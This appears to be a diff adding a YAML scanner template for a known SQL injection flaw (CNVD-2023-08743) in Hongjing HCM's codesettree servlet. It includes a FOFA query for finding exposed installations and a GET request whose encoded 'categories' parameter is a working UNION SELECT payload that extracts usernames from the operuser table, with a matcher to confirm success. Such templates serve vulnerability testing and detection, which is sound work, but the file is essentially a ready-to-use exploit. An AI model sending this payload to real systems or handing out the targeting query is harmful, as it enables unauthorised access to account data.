@@ -1,0 +1,22 @@
+id: CNVD-2023-08743
+info:
+  name: 宏景 HCM codesettree SQL注入漏洞
+  severity: high
+  type: SQL注入
+  search-engine:
+    - fofa: app="HJSOFT-HCM"
+  link:
+    - https://peiqi.wgpsec.org/wiki/webapp/%E5%AE%8F%E6%99%AF/%E5%AE%8F%E6%99%AF%20HCM%20codesettree%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2023-08743.html
+http:
+  logic: ""
+  Packets:
+    - method: GET
+      path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d
+      head:
+        Type: notype
+        Useragent: justdo
+      body: ""
+      matchers:
+        regex-logic: and
+        regex:
+          - target="mil_body"
